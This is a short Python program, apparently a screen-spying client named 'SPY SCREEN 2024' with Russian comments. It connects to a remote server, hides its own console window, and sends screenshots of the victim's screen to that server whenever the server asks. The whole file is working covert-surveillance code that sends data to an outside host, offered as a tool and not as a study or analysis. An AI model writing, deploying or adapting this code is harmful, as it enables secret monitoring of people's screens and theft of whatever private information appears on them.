import socket
import pyautogui
import pickle
import struct
from io import BytesIO
import time
import ctypes
import sys
from PIL import Image

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def show_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)

def Start_trans():
    try:
        while True:
            a = client_socket.recv(4096)
            if b' ' == a:
                # Захват изображения экрана
                screenshot = pyautogui.screenshot()

                # Преобразование изображения в байты
                buffer = BytesIO()
                screenshot.save(buffer, format='PNG')
                data = buffer.getvalue()
                # Отправка размера изображения
                message_size = struct.pack("I", len(data)) 
                print(message_size)
                
                client_socket.sendall(message_size + data)
                time.sleep(5)
            if b'0' == a:
                # show_console()
                # print('Connection closed')
                # time.sleep(15)
                client_socket.close()
    finally:
        # print('check')
        # Start_trans()
        client_socket.close()
        # show_console()
SERVER_IP = ''  # Публичный IP-адрес сервера
PORT = 11111                      # Порт для соединения


print('\n\nSPY SCREEN 2024 by RelictRaven & IPShow\n')
print('Вы хотите подключится к серверу по умолчанию?(да/нет)')
b = input()
if b == 'нет' or b == 'Нет' or b =='НЕТ' or b =='нЕТ' or b =='нЕт' or b =='n' or b =='N' or b =='no' or b =='No':
    print('Введи IP сервера SPY SCREEN: ', end ="")
    SERVER_IP = input()
    print('Введи Порт сервера SPY SCREEN: ', end ="")
    PORT = int(input())  # Публичный IP-адрес сервера
else:
    print('подключение по умолчанию...')


print('\nПодключаемся к ' + SERVER_IP + ':' + str(PORT) + '...')

# Создание сокета
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))  # Подключение к серверу
print('\nПодключено, консоль будет скрыта через 5 секунд')
time.sleep(5)
hide_console()
Start_trans()